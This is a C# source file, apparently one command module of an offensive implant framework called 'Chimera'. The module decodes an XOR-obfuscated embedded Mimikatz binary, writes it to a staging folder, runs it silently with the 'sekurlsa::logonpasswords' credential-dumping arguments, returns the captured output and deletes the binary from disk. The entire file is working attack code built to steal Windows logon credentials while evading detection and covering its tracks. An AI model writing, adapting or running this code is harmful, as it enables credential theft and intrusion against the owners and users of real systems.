using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Chimera.Commands
{
    // mimikatz — decrypt embedded mimikatz_enc resource (XOR 0x41),
    //            write to staging dir, execute with standard cred-dump args,
    //            capture and return output.
    public static class Mimikatz
    {
        private const string ExeName = "mimikatz.exe";
        private static readonly string ExePath = Path.Combine(Staging.Dir, ExeName);

        public static string Execute()
        {
            try
            {
                Staging.EnsureDir();

                // 1. Load embedded resource mimikatz_enc
                var thisAsm = Assembly.GetExecutingAssembly();
                var stream  = thisAsm.GetManifestResourceStream("mimikatz_enc");
                if (stream == null)
                    return "[error] Resource 'mimikatz_enc' not found. " +
                           "Bundle it with /res:mimikatz_enc,mimikatz_enc at build time.";

                byte[] enc = new byte[stream.Length];
                stream.Read(enc, 0, enc.Length);
                stream.Close();

                // 2. XOR decrypt (key 0x41)
                byte[] dec = new byte[enc.Length];
                for (int i = 0; i < enc.Length; i++)
                    dec[i] = (byte)(enc[i] ^ 0x41);

                // 3. Write to staging dir
                File.WriteAllBytes(ExePath, dec);

                // 4. Execute silently and capture output
                var psi = new ProcessStartInfo
                {
                    FileName               = ExePath,
                    Arguments              = "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
                    UseShellExecute        = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    CreateNoWindow         = true,
                    WorkingDirectory       = Staging.Dir
                };

                string stdout, stderr;
                using (Process p = Process.Start(psi))
                {
                    stdout = p.StandardOutput.ReadToEnd();
                    stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit(30000);
                }

                // 5. Clean up binary from disk
                try { File.Delete(ExePath); } catch { }

                string output = stdout;
                if (!string.IsNullOrEmpty(stderr)) output += "\n[stderr]\n" + stderr;
                return string.IsNullOrEmpty(output.Trim())
                    ? "[-] Mimikatz ran but produced no output (likely needs SYSTEM or SeDebugPrivilege)."
                    : output;
            }
            catch (Exception ex)
            {
                return "[error] mimikatz: " + ex.Message;
            }
        }
    }
}
